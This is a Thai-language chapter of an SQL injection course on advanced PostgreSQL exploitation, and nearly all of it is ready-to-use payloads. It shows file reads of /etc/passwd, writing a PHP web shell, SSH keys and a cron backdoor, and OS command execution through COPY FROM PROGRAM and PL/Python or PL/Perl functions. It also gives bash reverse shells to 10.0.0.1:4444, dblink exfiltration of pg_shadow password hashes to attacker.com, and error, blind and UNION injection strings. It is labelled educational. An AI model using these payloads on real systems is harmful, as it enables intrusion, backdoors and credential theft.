# Part 021: PostgreSQL Advanced Exploitation

## ภาพรวม

PostgreSQL มีความสามารถพิเศษหลายอย่างรวมถึง COPY command, dblink extension, และ PL language extensions

**ขั้นตอนที่ 266-285**

---

## 266. PostgreSQL พื้นฐาน

```sql
-- Syntax ต่างจาก MySQL
SELECT 'hello' || ' ' || 'world';   -- || สำหรับ concat
SELECT SUBSTRING('hello' FROM 1 FOR 3);  -- SUBSTRING syntax
SELECT '123'::int;                  -- ::type สำหรับ cast

-- System info
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT current_schema;

-- Databases
SELECT datname FROM pg_database;

-- Tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Users
SELECT usename, passwd FROM pg_shadow;
SELECT rolname FROM pg_roles;
```

---

## 267. PostgreSQL COPY Command - File Operations

### 67.1 COPY FROM - File Read

```sql
-- สร้าง table ชั่วคราว
CREATE TABLE tmp_read (data text);

-- อ่าน file
COPY tmp_read FROM '/etc/passwd';

-- ดูข้อมูล
SELECT * FROM tmp_read;

-- ทำความสะอาด
DROP TABLE tmp_read;

-- ผ่าน injection (stacked queries)
'; CREATE TABLE tmp (d text);--
'; COPY tmp FROM '/etc/passwd';--
'; SELECT * FROM tmp LIMIT 1;-- (อ่านผ่าน union)
```

### 67.2 COPY TO - File Write

```sql
-- เขียนข้อมูลไป file
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- เขียน SSH key
COPY (SELECT 'ssh-rsa AAAA...') TO '/home/postgres/.ssh/authorized_keys';

-- เขียน crontab
COPY (SELECT '* * * * * root /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1') 
TO '/etc/cron.d/backdoor';
```

### 67.3 COPY PROGRAM - OS Command Execution

```sql
-- COPY FROM PROGRAM รัน command และอ่าน output
COPY tmp FROM PROGRAM 'id';
COPY tmp FROM PROGRAM 'cat /etc/passwd';
COPY tmp FROM PROGRAM 'whoami';

-- reverse shell
COPY tmp FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"';

-- ผ่าน injection
'; CREATE TABLE tmp (d text);--
'; COPY tmp FROM PROGRAM 'id';--
'; SELECT * FROM tmp;-- (อ่านผ่าน union)
```

---

## 268. pg_read_file() - Server File Access

```sql
-- อ่าน server-side files
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/postgresql/14/main/postgresql.conf');
SELECT pg_read_file('/var/lib/postgresql/.bash_history');

-- อ่าน N bytes
SELECT pg_read_file('/etc/passwd', 0, 1024);

-- ผ่าน injection
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
```

---

## 269. dblink Extension - OOB Exfiltration

```sql
-- ตรวจสอบ extension
SELECT * FROM pg_extension WHERE extname='dblink';

-- DNS Exfiltration ผ่าน dblink
SELECT dblink_connect('host=' || current_user || '.attacker.com dbname=test user=x password=x');

-- ดึงข้อมูลผ่าน dblink
SELECT * FROM dblink(
  'host=attacker.com dbname=exfil user=attacker password=pass',
  'SELECT current_database()'
) AS t(data text);

-- ผ่าน injection
'; SELECT dblink_connect(''host=''||(SELECT password FROM pg_shadow LIMIT 1)||''.attacker.com'');--
```

---

## 270. PL/Python Extension

```sql
-- ต้องการ superuser
CREATE EXTENSION plpythonu;

-- สร้าง function รัน OS command
CREATE OR REPLACE FUNCTION exec_cmd(cmd text)
RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;

-- รัน command
SELECT exec_cmd('id');
SELECT exec_cmd('cat /etc/passwd');
SELECT exec_cmd('whoami');

-- reverse shell
SELECT exec_cmd('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"');

-- ทำความสะอาด
DROP FUNCTION exec_cmd;
DROP EXTENSION plpythonu;
```

---

## 271. PL/Perl Extension

```sql
CREATE EXTENSION plperlu;

CREATE OR REPLACE FUNCTION exec_perl(cmd text)
RETURNS text AS $$
  my $cmd = shift;
  my $output = `$cmd`;
  return $output;
$$ LANGUAGE plperlu;

SELECT exec_perl('id');
```

---

## 272. Large Objects - Binary File Upload

```sql
-- Import binary file ไปยัง database
SELECT lo_import('/tmp/backdoor');
-- คืน OID ของ large object

-- Export กลับไปที่ path ที่ต้องการ
SELECT lo_export(12345, '/var/www/html/backdoor.php');

-- ดู large objects
SELECT loid, pageno FROM pg_largeobject LIMIT 5;

-- เขียน data ไปยัง large object
SELECT lowrite(lo_open(12345, 131072), decode('3c3f70687020...', 'hex'));

-- ลบ large object
SELECT lo_unlink(12345);
```

---

## 273. PostgreSQL Error-Based

```sql
-- CAST error
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT usename FROM pg_shadow LIMIT 1) AS int)--

-- Division by zero
' AND 1/(SELECT 0 FROM (SELECT version() OFFSET 0 LIMIT 1) x)--

-- interval error
' AND 1=EXTRACT(EPOCH FROM '1 second'::interval + (SELECT version()))--

-- JSON error
' AND (SELECT CAST((SELECT version()) AS json))::int IS NULL--
```

---

## 274. PostgreSQL Boolean/Time-Based Blind

```sql
-- Boolean
' AND '1'='1
' AND (SELECT SUBSTRING(current_database(),1,1))='t
' AND (SELECT SUBSTRING(usename,1,1) FROM pg_shadow LIMIT 1)='p

-- Time-based
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--
' AND (SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--

-- สำหรับ binary search
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>64) THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NOT NULL--
```

---

## 275. PostgreSQL UNION-Based

```sql
-- หา column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = column count is 2)

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- หา string column
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--

-- ดึงข้อมูล
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--

-- ดึง tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- ดึง passwords
' UNION SELECT usename||':'||passwd,NULL FROM pg_shadow--
```

---

## 276. แบบฝึกหัด PostgreSQL

```sql
-- ทดสอบ basic injection
' OR '1'='1
' UNION SELECT version(),NULL--

-- ทดสอบ COPY command (ถ้ามี permission)
'; CREATE TABLE t (d text);--
'; COPY t FROM PROGRAM 'id';--
'; SELECT * FROM t;--

-- ทดสอบ dblink
'; SELECT dblink_connect('host=127.0.0.1 dbname=postgres user=postgres password=postgres');--
```

---

## สรุป

PostgreSQL Advanced:
- **COPY FROM/TO** - file read/write
- **COPY FROM PROGRAM** - OS command execution
- **pg_read_file()** - server file access
- **dblink** - OOB exfiltration
- **PL/Python, PL/Perl** - scripting language execution
- **Large Objects** - binary file upload/download

---

*Part 021 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
